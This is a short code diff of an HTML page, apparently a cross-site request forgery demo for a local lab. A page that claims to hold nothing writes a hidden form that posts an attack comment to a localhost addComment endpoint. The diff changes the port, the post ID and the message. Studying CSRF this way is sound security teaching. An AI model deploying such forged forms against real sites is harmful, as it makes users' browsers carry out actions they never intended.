@@ -8,9 +8,9 @@
 		hello，这里什么也没有。
 		<script>
 			document.write(`
-				<form name="commentForm" target="csrf" method="post" action="http://localhost:1521/post/addComment">
-					<input name="postId" type="hidden" value="1">
-					<textarea name="content">来自CSRF！</textarea>
+				<form name="commentForm" target="csrf" method="post" action="http://localhost:3000/post/addComment">
+					<input name="postId" type="hidden" value="13">
+					<textarea name="content">我是一个攻击</textarea>
 				</form>`
 			);
 
